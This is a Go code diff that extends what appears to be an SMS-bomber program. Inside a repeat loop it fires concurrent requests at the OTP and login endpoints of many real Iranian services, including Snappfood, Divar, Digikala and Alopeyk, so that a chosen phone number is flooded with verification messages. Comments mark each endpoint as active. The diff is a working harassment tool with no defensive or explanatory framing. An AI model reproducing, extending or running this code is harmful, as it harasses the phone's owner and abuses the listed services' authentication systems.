@@ -103,12 +103,56 @@ func main() {
 	ch := make(chan int)
 
 	for i := 0; i < repeatCount; i++ {
-    payload := map[string]interface{}{
-        "cellphone": phone, 
-    }
-    fmt.Println("Payload:", payload) 
-    go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/otp", payload, ch)
-}
+		formData := url.Values{}
+		formData.Set("cellphone", phone)
+		requestBody := strings.NewReader(formData.Encode())
+		go func() {
+			resp, err := http.Post("https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", "application/x-www-form-urlencoded", requestBody)
+			if err != nil {
+				fmt.Println("\033[01;31m[-] Error while sending request to Snappfood!\033[0m")
+				ch <- http.StatusInternalServerError
+				return
+			}
+			defer resp.Body.Close()
+			ch <- resp.StatusCode
+		}()     //active✅
+		go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
+			"phone": phone,
+		}, ch)  //active✅
+		go sms("https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  //active✅
+		s15 := fmt.Sprintf("'mobile': %s, 'country_code': '+98'", phone)
+		go sms("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
+			s15: phone,
+		}, ch)  //active✅
+		go sms("https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
+			"mobile": phone,
+		}, ch)     //active✅
+		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
+			"username": phone,
+		}, ch)    //active✅
+		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
+			"phone": phone,
+		}, ch)    //active✅
+		go sms("https://api.iranicard.ir/api/v1/register", map[string]interface{}{
+			"mobile": phone,
+		}, ch)    //active✅
+		go sms("https://alopeyk.com/api/sms/send.php", map[string]interface{}{
+			"phone": phone,
+		}, ch)   //active✅
+		go sms("https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
+			"phone": phone,
+		}, ch)    //active✅
+		go sms("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch)    //active✅
+		go sms("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
+			"username": phone,
+		}, ch)    //active✅
+		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
+			"phone": phone,
+		}, ch)    //active✅
 
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
